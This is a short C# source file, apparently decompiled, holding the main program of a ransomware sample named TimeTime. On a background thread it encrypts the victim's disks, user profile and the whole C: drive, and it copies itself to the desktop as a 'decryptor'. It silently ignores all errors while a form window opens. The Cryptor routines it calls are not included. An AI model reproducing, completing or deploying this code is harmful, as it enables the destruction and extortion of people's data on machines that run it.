using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime;

internal static class Program
{
	private static void DoStuff()
	{
		try
		{
			Cryptor.EncryptDisks();
			Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Settings.decryptor_file_name);
			Cryptor.EncryptFolder("C:\\");
		}
		catch (Exception)
		{
		}
	}

	[STAThread]
	private static void Main()
	{
		try
		{
			Thread thread = new Thread(DoStuff);
			thread.Start();
		}
		catch (Exception)
		{
			DoStuff();
		}
		Thread.Sleep(500);
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}
}
